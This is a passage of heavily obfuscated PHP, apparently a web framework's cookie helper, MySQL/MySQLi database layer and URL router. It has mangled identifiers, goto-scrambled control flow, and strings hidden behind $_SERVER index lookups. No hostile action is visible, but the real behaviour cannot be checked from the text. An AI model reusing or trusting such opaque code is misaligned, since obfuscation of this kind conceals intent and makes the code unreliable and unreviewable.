fãóì§œ›ì: $càÃ¦ö« = $D¶ÕÙé÷‡¤[33]; setcookie($cÃ„ÖåêŸ–, $d©ÆŸ„²„ù, time() + $F„‰”Ó‰÷Œ, $D¶ÕÙé÷‡¤[8] . trim($aÂŠ¢º²÷Ï, $D¶ÕÙé÷‡¤[8]) . $càÃ¦ö«, !1, !1, $bİ‰ØÀ¸‡¡); goto f¾ªËƒ·Û; f¾ªËƒ·Û: } public static function setSafe($BˆÃ±¢÷Í¢, $DàĞß­õÚÂ, $e ğŒ³á‘ = 0) { self::set($BˆÃ±¢÷Í¢, $DàĞß­õÚÂ, $e ğŒ³á‘, !0); } public static function get($aÆÈÍàÓôŒ) { return isset($_COOKIE[$aÆÈÍàÓôŒ]) ? $_COOKIE[$aÆÈÍàÓôŒ] : !1; } public static function remove($Aš·ÑŠøº£, $Aò‡¢ÃŒ = false) { unset($_COOKIE[$Aš·ÑŠøº£]); self::set($Aš·ÑŠøº£, $_SERVER[ÒÆ›ÆØÎ¾][33], 1, $Aò‡¢ÃŒ); } } class DbMysql extends Db { public function __construct($Fõ‹Ê§Õ·Ğ = '') { $e¸Í·Ã‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!extension_loaded($e¸Í·Ã‡[751])) { think_exception(think_lang($e¸Í·Ã‡[10]) . $e¸Í·Ã‡[836]); } if (!empty($Fõ‹Ê§Õ·Ğ)) { $this->config = $Fõ‹Ê§Õ·Ğ; if (empty($this->config[$e¸Í·Ã‡[13]])) { $this->config[$e¸Í·Ã‡[13]] = $e¸Í·Ã‡[33]; } } } public function connect($cÒÄõ‹Â—£ = '', $a­é Œ¾ÅÄ = 0, $Bİ½£ªö¶´ = false) { $D¡êïŠˆá¸ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($this->linkID[$a­é Œ¾ÅÄ])) { goto cÅ……ôù°÷; Aáˆ²£òéš: mysql_query($D¡êïŠˆá¸[841] . think_config($D¡êïŠˆá¸[842]) . $D¡êïŠˆá¸[55], $this->linkID[$a­é Œ¾ÅÄ]); if ($A˜Êº¨¹æÊ > $D¡êïŠˆá¸[843]) { mysql_query($D¡êïŠˆá¸[844], $this->linkID[$a­é Œ¾ÅÄ]); } $this->connected = !0; goto E¨à›»ƒ; DÕ‘¬±ğìÏ: if ($F¿é¤ÒÛŒ©) { $this->linkID[$a­é Œ¾ÅÄ] = mysql_pconnect($b‹à”ì«øŞ, $cÒÄõ‹Â—£[$D¡êïŠˆá¸[839]], $cÒÄõ‹Â—£[$D¡êïŠˆá¸[840]], 131072); } else { $this->linkID[$a­é Œ¾ÅÄ] = mysql_connect($b‹à”ì«øŞ, $cÒÄõ‹Â—£[$D¡êïŠˆá¸[839]], $cÒÄõ‹Â—£[$D¡êïŠˆá¸[840]], !0, 131072); } if (!$this->linkID[$a­é Œ¾ÅÄ] || !empty($cÒÄõ‹Â—£[$D¡êïŠˆá¸[17]]) && !mysql_select_db($cÒÄõ‹Â—£[$D¡êïŠˆá¸[17]], $this->linkID[$a­é Œ¾ÅÄ])) { think_exception(mysql_error()); } $A˜Êº¨¹æÊ = mysql_get_server_info($this->linkID[$a­é Œ¾ÅÄ]); goto Aáˆ²£òéš; E¨à›»ƒ: if (1 != think_config($D¡êïŠˆá¸[18])) { unset($this->config); } goto aÉ«ìİ„ã; cÅ……ôù°÷: if (empty($cÒÄõ‹Â—£)) { $cÒÄõ‹Â—£ = $this->config; } $b‹à”ì«øŞ = $cÒÄõ‹Â—£[$D¡êïŠˆá¸[837]] . ($cÒÄõ‹Â—£[$D¡êïŠˆá¸[838]] ? "\x3a{$cÒÄõ‹Â—£[$D¡êïŠˆá¸[838]]}" : $D¡êïŠˆá¸[33]); $F¿é¤ÒÛŒ© = !empty($cÒÄõ‹Â—£[$D¡êïŠˆá¸[13]][$D¡êïŠˆá¸[14]]) ? $cÒÄõ‹Â—£[$D¡êïŠˆá¸[13]][$D¡êïŠˆá¸[14]] : $this->pconnect; goto DÕ‘¬±ğìÏ; aÉ«ìİ„ã: } return $this->linkID[$a­é Œ¾ÅÄ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aÜñ¨‹±©) { goto c®Ø»¬ó‡Æ; b†Å«Òˆ‰Ù: think_action_status($BÃÂ¸ä‘–Ï[19], 1); think_status($BÃÂ¸ä‘–Ï[20]); $this->queryID = mysql_query($aÜñ¨‹±©, $this->_linkID); goto e„Ë¨µ¤ˆ¯; e‚Ä•åÂÇ¿: if (!$this->_linkID) { return !1; } $this->queryStr = $aÜñ¨‹±©; if ($this->queryID) { $this->free(); } goto b†Å«Òˆ‰Ù; c®Ø»¬ó‡Æ: $BÃÂ¸ä‘–Ï =& $_SERVER[ÒÆ›ÆØÎ¾]; if (0 === stripos($aÜñ¨‹±©, $BÃÂ¸ä‘–Ï[262])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto e‚Ä•åÂÇ¿; e„Ë¨µ¤ˆ¯: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto c³ã¼Á‘¿; c³ã¼Á‘¿: } public function execute($dß¦É Ì…) { goto B”¦µä¨; Aƒç¼ÏÍ: $this->queryStr = $dß¦É Ì…; if ($this->queryID) { $this->free(); } think_action_status($eĞ°ŞŞŠâ[21], 1); goto F‚¶¿öÙ©‹; dÇÛ¬ÕÏŠ: if (!1 === $c‡ŒÀŠ›…) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto EÃ¯òœÜ³; F‚¶¿öÙ©‹: think_status($eĞ°ŞŞŠâ[20]); $c‡ŒÀŠ›… = mysql_query($dß¦É Ì…, $this->_linkID); $this->debug(); goto dÇÛ¬ÕÏŠ; B”¦µä¨: $eĞ°ŞŞŠâ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Aƒç¼ÏÍ; EÃ¯òœÜ³: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÒÆ›ÆØÎ¾][845], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÉé¥Â»ìÄ = mysql_query($_SERVER[ÒÆ›ÆØÎ¾][846], $this->_linkID); $this->transTimes = 0; if (!$BÉé¥Â»ìÄ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B‰İŠÏïÌ¸ = mysql_query($_SERVER[ÒÆ›ÆØÎ¾][847], $this->_linkID); $this->transTimes = 0; if (!$B‰İŠÏïÌ¸) { $this->error(); return !1; } } return !0; } private function getAll() { $A·òÉö¦¿‹ = array(); if ($this->numRows > 0) { while ($BºÀŞ‚ñİ  = mysql_fetch_assoc($this->queryID)) { $A·òÉö¦¿‹[] = $BºÀŞ‚ñİ ; } mysql_data_seek($this->queryID, 0); } return $A·òÉö¦¿‹; } public function getFields($Dñ« âÏ‡µ) { $dÅµ‚·æê‚ =& $_SERVER[ÒÆ›ÆØÎ¾]; $E‡ŸƒáÌèß = $this->query($dÅµ‚·æê‚[848] . $this->parseKey($Dñ« âÏ‡µ)); $C¨ÒÌ›×ôŒ = array(); if ($E‡ŸƒáÌèß) { foreach ($E‡ŸƒáÌèß as $a«îò½îƒÑ => $bñÄ»ëˆ‰) { $C¨ÒÌ›×ôŒ[$bñÄ»ëˆ‰[$dÅµ‚·æê‚[27]]] = array($dÅµ‚·æê‚[28] => $bñÄ»ëˆ‰[$dÅµ‚·æê‚[27]], $dÅµ‚·æê‚[29] => $bñÄ»ëˆ‰[$dÅµ‚·æê‚[30]], $dÅµ‚·æê‚[31] => (bool) (strtoupper($bñÄ»ëˆ‰[$dÅµ‚·æê‚[32]]) === $dÅµ‚·æê‚[849]), $dÅµ‚·æê‚[34] => $bñÄ»ëˆ‰[$dÅµ‚·æê‚[35]], $dÅµ‚·æê‚[36] => strtolower($bñÄ»ëˆ‰[$dÅµ‚·æê‚[37]]) == $dÅµ‚·æê‚[38], $dÅµ‚·æê‚[39] => strtolower($bñÄ»ëˆ‰[$dÅµ‚·æê‚[40]]) == $dÅµ‚·æê‚[41]); } } return $C¨ÒÌ›×ôŒ; } public function getTables($C“áñÎ’’³ = '') { $CæŸã§Â¿ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!empty($C“áñÎ’’³)) { $e²˜œÊôÀÖ = $CæŸã§Â¿[850] . $C“áñÎ’’³ . $CæŸã§Â¿[851]; } else { $e²˜œÊôÀÖ = $CæŸã§Â¿[852]; } $CøæŠ‰§ Í = $this->query($e²˜œÊôÀÖ); $d›ˆ÷¯÷ = array(); foreach ($CøæŠ‰§ Í as $FñÊ®ø¶ğŒ => $cˆÛƒâÒ–Ó) { $d›ˆ÷¯÷[$FñÊ®ø¶ğŒ] = current($cˆÛƒâÒ–Ó); } return $d›ˆ÷¯÷; } public function replace($E°‰İëÙø‹, $FØñÔ»“¡¦ = array()) { $AÖŒìééİÌ =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($E°‰İëÙø‹ as $bµ›„æ„ä— => $D§•¤£†Ô­) { $B‹Œçã¤§„ = $this->parseValue($D§•¤£†Ô­); if (is_scalar($B‹Œçã¤§„)) { $c¯‡šö§ÎÄ[] = $B‹Œçã¤§„; $dÆ‰ÛÉ¯ß[] = $this->parseKey($bµ›„æ„ä—); } } $e¶•õÅÔğ = $AÖŒìééİÌ[853] . $this->parseTable($FØñÔ»“¡¦[$AÖŒìééİÌ[277]]) . $AÖŒìééİÌ[854] . implode($AÖŒìééİÌ[47], $dÆ‰ÛÉ¯ß) . $AÖŒìééİÌ[855] . implode($AÖŒìééİÌ[47], $c¯‡šö§ÎÄ) . $AÖŒìééİÌ[856]; return $this->execute($e¶•õÅÔğ); } public function insertAll($aˆŠ¡Şº‚, $a¯à–áÍÉ = array(), $F¤±½À‹èÕ = false) { goto AÚø‚‰ëê; c¸Ö¶¢³³¬: $D¦ä¤Â·ŒÓ = array(); foreach ($aˆŠ¡Şº‚ as $E²„‘¬ƒš„) { $eË˜ÁŞ¥Íï = array(); foreach ($E²„‘¬ƒš„ as $bŒÉÚŞŒİ† => $bè¢ğã™æò) { $bè¢ğã™æò = $this->parseValue($bè¢ğã™æò); if (is_scalar($bè¢ğã™æò)) { $eË˜ÁŞ¥Íï[] = $bè¢ğã™æò; } } $D¦ä¤Â·ŒÓ[] = $BÈš•¯ãÖÅ[258] . implode($BÈš•¯ãÖÅ[47], $eË˜ÁŞ¥Íï) . $BÈš•¯ãÖÅ[856]; } array_walk($aÉìÆ ì¢², array($this, $BÈš•¯ãÖÅ[857])); goto A×ºãœäù; A×ºãœäù: $bîØò§¶å = ($F¤±½À‹èÕ ? $BÈš•¯ãÖÅ[858] : $BÈš•¯ãÖÅ[859]) . $BÈš•¯ãÖÅ[860] . $this->parseTable($a¯à–áÍÉ[$BÈš•¯ãÖÅ[277]]) . $BÈš•¯ãÖÅ[854] . implode($BÈš•¯ãÖÅ[47], $aÉìÆ ì¢²) . $BÈš•¯ãÖÅ[861] . implode($BÈš•¯ãÖÅ[47], $D¦ä¤Â·ŒÓ); return $this->execute($bîØò§¶å); goto A§®¥è‘è©; AÚø‚‰ëê: $BÈš•¯ãÖÅ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!is_array($aˆŠ¡Şº‚[0])) { return !1; } $aÉìÆ ì¢² = array_keys($aˆŠ¡Şº‚[0]); goto c¸Ö¶¢³³¬; A§®¥è‘è©: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $c¹øàº–ö‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->error = mysql_errno() . $c¹øàº–ö‘[4] . mysql_error($this->_linkID); if ($c¹øàº–ö‘[33] != $this->queryStr) { $this->error .= LNG($c¹øàº–ö‘[45]) . $this->queryStr; } think_trace($this->error, $c¹øàº–ö‘[33], $c¹øàº–ö‘[46]); return $this->error; } public function escapeString($föšó¨Ìø) { if ($this->_linkID) { return mysql_real_escape_string($föšó¨Ìø, $this->_linkID); } else { return mysql_escape_string($föšó¨Ìø); } } public function parseKey(&$AôÛÎ©æ, $B±ÄÓ–¾‘ó = true) { $AŠÂ¶µÌÒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($B±ÄÓ–¾‘ó) { $AôÛÎ©æ = $this->parseKeyCheck($AôÛÎ©æ); } if ($AôÛÎ©æ != $AŠÂ¶µÌÒ[182] && !preg_match($AŠÂ¶µÌÒ[862], $AôÛÎ©æ)) { $AôÛÎ©æ = $AŠÂ¶µÌÒ[382] . trim($AôÛÎ©æ, $AŠÂ¶µÌÒ[382]) . $AŠÂ¶µÌÒ[382]; } return $AôÛÎ©æ; } } class DbMysqli extends Db { public function __construct($AŠ‡­‡òô = '') { $C°Ù¹–ÔµÎ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!extension_loaded($C°Ù¹–ÔµÎ[750])) { think_exception(think_lang($C°Ù¹–ÔµÎ[10]) . $C°Ù¹–ÔµÎ[863]); } if (!empty($AŠ‡­‡òô)) { $this->config = $AŠ‡­‡òô; if (empty($this->config[$C°Ù¹–ÔµÎ[13]])) { $this->config[$C°Ù¹–ÔµÎ[13]] = $C°Ù¹–ÔµÎ[33]; } } } public function connect($Fµ™Ö˜§‡Á = '', $A”‰ÊÃ·µ´ = 0) { $bÃ¡ïÒ¬‹¹ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($this->linkID[$A”‰ÊÃ·µ´])) { goto f„ñ¦‚ƒ³; c‡êñî¼ˆ: $this->connected = !0; if (1 != think_config($bÃ¡ïÒ¬‹¹[18])) { unset($this->config); } goto cõŠ®ˆâË‚; f„ñ¦‚ƒ³: if (empty($Fµ™Ö˜§‡Á)) { $Fµ™Ö˜§‡Á = $this->config; } $this->linkID[$A”‰ÊÃ·µ´] = new mysqli($Fµ™Ö˜§‡Á[$bÃ¡ïÒ¬‹¹[837]], $Fµ™Ö˜§‡Á[$bÃ¡ïÒ¬‹¹[839]], $Fµ™Ö˜§‡Á[$bÃ¡ïÒ¬‹¹[840]], $Fµ™Ö˜§‡Á[$bÃ¡ïÒ¬‹¹[17]], $Fµ™Ö˜§‡Á[$bÃ¡ïÒ¬‹¹[838]] ? intval($Fµ™Ö˜§‡Á[$bÃ¡ïÒ¬‹¹[838]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto E´ƒƒ½Õ°ƒ; E´ƒƒ½Õ°ƒ: $eâŞ†¼¦“ = $this->linkID[$A”‰ÊÃ·µ´]->server_version; $this->linkID[$A”‰ÊÃ·µ´]->query($bÃ¡ïÒ¬‹¹[841] . think_config($bÃ¡ïÒ¬‹¹[842]) . $bÃ¡ïÒ¬‹¹[55]); if ($eâŞ†¼¦“ > $bÃ¡ïÒ¬‹¹[843]) { $this->linkID[$A”‰ÊÃ·µ´]->query($bÃ¡ïÒ¬‹¹[844]); } goto c‡êñî¼ˆ; cõŠ®ˆâË‚: } return $this->linkID[$A”‰ÊÃ·µ´]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($AÚƒÔ’ã³À) { goto AƒäêÃÕé¤; fºÑ„Áƒ‡: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto D£óˆß›ÒÑ; A¬Š¦–‘ë: $this->queryStr = $AÚƒÔ’ã³À; if ($this->queryID) { $this->free(); } think_action_status($A˜Äº–‰À[19], 1); goto a…Ñ÷±éË¹; a…Ñ÷±éË¹: think_status($A˜Äº–‰À[20]); $this->queryID = $this->_linkID->query($AÚƒÔ’ã³À); if ($this->_linkID->more_results()) { while (($C±ë‡£„Î = $this->_linkID->next_result()) != NULL) { $C±ë‡£„Î->free_result(); } } goto fºÑ„Áƒ‡; AƒäêÃÕé¤: $A˜Äº–‰À =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A¬Š¦–‘ë; D£óˆß›ÒÑ: } public function execute($F±¢ÔğÆå˜) { goto d¤—î¬Ï†¦; d¤—î¬Ï†¦: $b÷Ê§ßÈ©³ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f’•¶‡ËØ; C•‰òĞ¤Üö: think_status($b÷Ê§ßÈ©³[20]); $eªá²ŞÄàÑ = $this->_linkID->query($F±¢ÔğÆå˜); $this->debug(); goto e›ÎŞÄŒ; e›ÎŞÄŒ: if (!1 === $eªá²ŞÄàÑ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto E¡èË©¿; f’•¶‡ËØ: $this->queryStr = $F±¢ÔğÆå˜; if ($this->queryID) { $this->free(); } think_action_status($b÷Ê§ßÈ©³[21], 1); goto C•‰òĞ¤Üö; E¡èË©¿: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d”¥ÚÂóÍµ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$d”¥ÚÂóÍµ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $BŠİÖ™ÒÚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$BŠİÖ™ÒÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $cóêùˆùˆø = array(); if ($this->numRows > 0) { for ($DÀ ‘¨Ğ§İ = 0; $DÀ ‘¨Ğ§İ < $this->numRows; $DÀ ‘¨Ğ§İ++) { $cóêùˆùˆø[$DÀ ‘¨Ğ§İ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $cóêùˆùˆø; } public function getFields($e¶Ç¾Š¢›‘) { $BÇ‚“ğ•ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Bœâ¯Ÿ¦ç = $this->query($BÇ‚“ğ•ñ[848] . $this->parseKey($e¶Ç¾Š¢›‘)); $b—•ñø˜Š¥ = array(); if ($Bœâ¯Ÿ¦ç) { foreach ($Bœâ¯Ÿ¦ç as $Dàº¬ËÂÀ¯ => $E•Ó Ğôø®) { $b—•ñø˜Š¥[$E•Ó Ğôø®[$BÇ‚“ğ•ñ[27]]] = array($BÇ‚“ğ•ñ[28] => $E•Ó Ğôø®[$BÇ‚“ğ•ñ[27]], $BÇ‚“ğ•ñ[29] => $E•Ó Ğôø®[$BÇ‚“ğ•ñ[30]], $BÇ‚“ğ•ñ[31] => (bool) ($E•Ó Ğôø®[$BÇ‚“ğ•ñ[32]] === $BÇ‚“ğ•ñ[33]), $BÇ‚“ğ•ñ[34] => $E•Ó Ğôø®[$BÇ‚“ğ•ñ[35]], $BÇ‚“ğ•ñ[36] => strtolower($E•Ó Ğôø®[$BÇ‚“ğ•ñ[37]]) == $BÇ‚“ğ•ñ[38], $BÇ‚“ğ•ñ[39] => strtolower($E•Ó Ğôø®[$BÇ‚“ğ•ñ[40]]) == $BÇ‚“ğ•ñ[41]); } } return $b—•ñø˜Š¥; } public function getTables($CíõÇ¥‡Ñ¶ = '') { $A±½œ¥Ï„Ò =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dª˜İåòÇ” = !empty($CíõÇ¥‡Ñ¶) ? $A±½œ¥Ï„Ò[850] . $CíõÇ¥‡Ñ¶ . $A±½œ¥Ï„Ò[851] : $A±½œ¥Ï„Ò[852]; $AŞ®ñéä¡¬ = $this->query($Dª˜İåòÇ”); $C›œÆ­µ¼˜ = array(); if ($AŞ®ñéä¡¬) { foreach ($AŞ®ñéä¡¬ as $D²¶êÇ‡ => $A×«Ò˜«ª‘) { $C›œÆ­µ¼˜[$D²¶êÇ‡] = current($A×«Ò˜«ª‘); } } return $C›œÆ­µ¼˜; } public function replace($a²ŞÖ®„­, $A·¯©õÚ°­ = array()) { $Eø›Âˆì‰’ =& $_SERVER[ÒÆ›ÆØÎ¾]; foreach ($a²ŞÖ®„­ as $aïÈ‘ÜÒº‘ => $aˆ¿ó¨¢ÀÕ) { $FÔ‹°ø®«… = $this->parseValue($aˆ¿ó¨¢ÀÕ); if (is_scalar($FÔ‹°ø®«…)) { $aê‰Şøì [] = $FÔ‹°ø®«…; $DÓ•Ü…ÛÊ£[] = $this->parseKey($aïÈ‘ÜÒº‘); } } $dŞÄ‰¤«ğê = $Eø›Âˆì‰’[853] . $this->parseTable($A·¯©õÚ°­[$Eø›Âˆì‰’[277]]) . $Eø›Âˆì‰’[854] . implode($Eø›Âˆì‰’[47], $DÓ•Ü…ÛÊ£) . $Eø›Âˆì‰’[855] . implode($Eø›Âˆì‰’[47], $aê‰Şøì ) . $Eø›Âˆì‰’[856]; return $this->execute($dŞÄ‰¤«ğê); } public function insertAll($d…É‰—˜Ç, $c¶ßÅ›ƒ‹ = array(), $CÍˆ’ Ó = false) { goto a±ôù ·; aÙ©Á†¨Âä: $AÄ†¨ğ–š¨ = $CÍˆ’ Ó ? $aÔéÊàôçÊ[858] : $aÔéÊàôçÊ[859]; $bê†÷•ëÚÜ = $AÄ†¨ğ–š¨ . $aÔéÊàôçÊ[860] . $this->parseTable($c¶ßÅ›ƒ‹[$aÔéÊàôçÊ[277]]) . $aÔéÊàôçÊ[854] . implode($aÔéÊàôçÊ[47], $fÆ¾¨§©¤“) . $aÔéÊàôçÊ[861] . implode($aÔéÊàôçÊ[47], $Cš™ñÕâ—¼); return $this->execute($bê†÷•ëÚÜ); goto BÑ²Ğô„; f‡¿Îë¼±­: $Cš™ñÕâ—¼ = array(); foreach ($d…É‰—˜Ç as $C¦Şß˜š‹·) { $aŠÉ‡éÆó… = array(); foreach ($C¦Şß˜š‹· as $eáÀ‰Ô›ïî => $DøäØ£¥—½) { $DøäØ£¥—½ = $this->parseValue($DøäØ£¥—½); if (is_scalar($DøäØ£¥—½)) { $aŠÉ‡éÆó…[] = $DøäØ£¥—½; } } $Cš™ñÕâ—¼[] = $aÔéÊàôçÊ[258] . implode($aÔéÊàôçÊ[47], $aŠÉ‡éÆó…) . $aÔéÊàôçÊ[856]; } array_walk($fÆ¾¨§©¤“, array($this, $aÔéÊàôçÊ[857])); goto aÙ©Á†¨Âä; a±ôù ·: $aÔéÊàôçÊ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!is_array($d…É‰—˜Ç[0])) { return !1; } $fÆ¾¨§©¤“ = array_keys($d…É‰—˜Ç[0]); goto f‡¿Îë¼±­; BÑ²Ğô„: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c©Ùé‚íÉ˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->error = $this->_linkID->errno . $c©Ùé‚íÉ˜[4] . $this->_linkID->error; if ($c©Ùé‚íÉ˜[33] != $this->queryStr) { $this->error .= LNG($c©Ùé‚íÉ˜[45]) . $this->queryStr; } think_trace($this->error, $c©Ùé‚íÉ˜[33], $c©Ùé‚íÉ˜[46]); return $this->error; } public function escapeString($eöÄØÜòç£) { if ($this->_linkID) { return $this->_linkID->real_escape_string($eöÄØÜòç£); } else { return addslashes($eöÄØÜòç£); } } public function parseKey(&$aÒ‹™ŞçØÔ, $c‡ôï×¹ùŒ = true) { $fœ—ôÚÄ“² =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($c‡ôï×¹ùŒ) { $aÒ‹™ŞçØÔ = $this->parseKeyCheck($aÒ‹™ŞçØÔ); } if ($aÒ‹™ŞçØÔ != $fœ—ôÚÄ“²[182] && !preg_match($fœ—ôÚÄ“²[862], $aÒ‹™ŞçØÔ)) { $aÒ‹™ŞçØÔ = $fœ—ôÚÄ“²[382] . trim($aÒ‹™ŞçØÔ, $fœ—ôÚÄ“²[382]) . $fœ—ôÚÄ“²[382]; } return $aÒ‹™ŞçØÔ; } } goto BğÉô˜ãÈ; bù¼„ÙõÁ§: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\171" => "\x5b\136\x2f\135\53", "\x3a\x6e\x75\155" => "\133\60\55\71\135\x2b", "\x3a\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($b–ÃŞ©ï¹, $AÈ¥ÃÁâå) { $fßÄŠ¨Úª´ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($b–ÃŞ©ï¹ == $fßÄŠ¨Úª´[1466]) { $f¶Àæ˜á§  = array_map($fßÄŠ¨Úª´[1467], $AÈ¥ÃÁâå[0]); $dç¬Ğ‚„é = strpos($AÈ¥ÃÁâå[1], $fßÄŠ¨Úª´[8]) === 0 ? $AÈ¥ÃÁâå[1] : $fßÄŠ¨Úª´[8] . $AÈ¥ÃÁâå[1]; $c§Ş«ßˆ¸› = $AÈ¥ÃÁâå[2]; } else { $f¶Àæ˜á§  = null; $dç¬Ğ‚„é = strpos($AÈ¥ÃÁâå[0], $fßÄŠ¨Úª´[8]) === 0 ? $AÈ¥ÃÁâå[0] : $fßÄŠ¨Úª´[8] . $AÈ¥ÃÁâå[0]; $c§Ş«ßˆ¸› = $AÈ¥ÃÁâå[1]; } array_push(self::$maps, $f¶Àæ˜á§ ); array_push(self::$routes, $dç¬Ğ‚„é); array_push(self::$methods, strtoupper($b–ÃŞ©ï¹)); array_push(self::$callbacks, $c§Ş«ßˆ¸›); } public static function error($añâØãÈÕ²) { self::$errorCallback = $añâØãÈÕ²; } public static function haltOnMatch($fö°šŒºŠò = true) { self::$halts = $fö°šŒºŠò; } public static function dispatch() { goto FîÊÙöªæ; FîÊÙöªæ: $fƒ…ò·Öéæ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÉ•ğ»ªÏ¥ = parse_url($_SERVER[$fƒ…ò·Öéæ[1468]], PHP_URL_PATH); $A°‹¾˜ˆ…à = $_SERVER[$fƒ…ò·Öéæ[157]]; goto e‡µ¤¤ñˆ‹; Dô¶§Øîõ¡: self::$routes = preg_replace($fƒ…ò·Öéæ[1155], $fƒ…ò·Öéæ[8], self::$routes); if (in_array($BÉ•ğ»ªÏ¥, self::$routes)) { $AËØö¿ŠÃ• = array_keys(self::$routes, $BÉ•ğ»ªÏ¥); foreach ($AËØö¿ŠÃ• as $bçÑíášŸù) { if (self::$methods[$bçÑíášŸù] == $A°‹¾˜ˆ…à || self::$methods[$bçÑíášŸù] == $fƒ…ò·Öéæ[1469] || in_array($A°‹¾˜ˆ…à, self::$maps[$bçÑíášŸù])) { $D±¿Áßµé¨ = !0; if (!is_object(self::$callbacks[$bçÑíášŸù])) { $bŸñ÷¨ŒêÎ = explode($fƒ…ò·Öéæ[8], self::$callbacks[$bçÑíášŸù]); $D’Ö„ïÍ‚Á = end($bŸñ÷¨ŒêÎ); $f°ƒÁ³›ó  = explode($fƒ…ò·Öéæ[1470], $D’Ö„ïÍ‚Á); $b†—Âò¦Òğ = new $f°ƒÁ³›ó [0](); $b†—Âò¦Òğ->{$f°ƒÁ³›ó [1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$bçÑíášŸù]); if (self::$halts) { return; } } } } } else { $Dìï½•¢Á = 0; foreach (self::$routes as $bçÑíášŸù) { if (strpos($bçÑíášŸù, $fƒ…ò·Öéæ[4]) !== !1) { $bçÑíášŸù = str_replace($cÃ—Å½», $Aß¯˜Éñãš, $bçÑíášŸù); } if (preg_match($fƒ…ò·Öéæ[1471] . $bçÑíášŸù . $fƒ…ò·Öéæ[1472], $BÉ•ğ»ªÏ¥, $DƒÁªÙ÷‹­)) { if (self::$methods[$Dìï½•¢Á] == $A°‹¾˜ˆ…à || self::$methods[$Dìï½•¢Á] == $fƒ…ò·Öéæ[1469] || !empty(self::$maps[$Dìï½•¢Á]) && in_array($A°‹¾˜ˆ…à, self::$maps[$Dìï½•¢Á])) { $D±¿Áßµé¨ = !0; array_shift($DƒÁªÙ÷‹­); if (!is_object(self::$callbacks[$Dìï½•¢Á])) { $bŸñ÷¨ŒêÎ = explode($fƒ…ò·Öéæ[8], self::$callbacks[$Dìï½•¢Á]); $D’Ö„ïÍ‚Á = end($bŸñ÷¨ŒêÎ); $f°ƒÁ³›ó  = explode($fƒ…ò·Öéæ[1470], $D’Ö„ïÍ‚Á); $b†—Âò¦Òğ = new $f°ƒÁ³›ó [0](); if (!method_exists($b†—Âò¦Òğ, $f°ƒÁ³›ó [1])) { echo $fƒ…ò·Öéæ[1473]; } else { call_user_func_array(array($b†—Âò¦Òğ, $f°ƒÁ³›ó [1]), $DƒÁªÙ÷‹­); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Dìï½•¢Á], $DƒÁªÙ÷‹­); if (self::$halts) { return; } } } } $Dìï½•¢Á++; } } if ($D±¿Áßµé¨ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $E¤ç¤„Üèô =& $_SERVER[ÒÆ›ÆØÎ¾]; header($_SERVER[$E¤ç¤„Üèô[1474]] . $E¤ç¤„Üèô[1475]); echo $E¤ç¤„Üèô[1476]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$fƒ…ò·Öéæ[1468]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto eÂŠ®º“ŠŸ; e‡µ¤¤ñˆ‹: $cÃ—Å½» = array_keys(static::$patterns); $Aß¯˜Éñãš = array_values(static::$patterns); $D±¿Áßµé¨ = !1; goto Dô¶§Øîõ¡; eÂŠ®º“ŠŸ: } } class Session { public static $sessionTime; public static $sessionSign; public static 